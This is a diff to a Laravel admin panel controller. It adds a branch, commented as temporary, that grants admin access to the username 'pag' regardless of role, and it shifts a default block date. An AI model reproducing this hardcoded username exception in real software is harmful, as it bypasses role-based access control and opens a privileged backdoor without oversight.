@@ -10,21 +10,31 @@ class AdminPanelController extends Controller
 {
     public function __construct()
     {
-        // Upewnij się, że użytkownik jest zalogowany i ma rolę 'supermanager'
+        // Ensure the user is logged in and has role 'supermanager'
         $this->middleware(function ($request, $next) {
-            if (Auth::check() && Auth::user()->role === 'supermanager') {
-                return $next($request);
+            if (Auth::check()) {
+                if (Auth::user()->role === 'supermanager') {
+                    return $next($request);
+                }
+
+                // BEGIN temporary access for user 'pag'
+                // This section allows the user with username 'pag' to access the admin panel
+                if (Auth::user()->username === 'pag') {
+                    return $next($request);
+                }
+                // END temporary access for user 'pag'
             }
             return redirect('/')->with('error', 'Brak dostępu do panelu administratora.');
         });
     }
+
 
     public function index()
     {
         $employees = \App\Models\Employee::orderBy('created_at', 'desc')->get();
     
         // Pobierz aktualną datę blokady
-        $blockDate = Carbon::parse(config('app.block_date', '2024-12-05'));
+        $blockDate = Carbon::parse(config('app.block_date', '2024-12-10'));
     
         // Pobierz listę użytkowników
         $users = \App\Models\User::orderBy('name')->get();
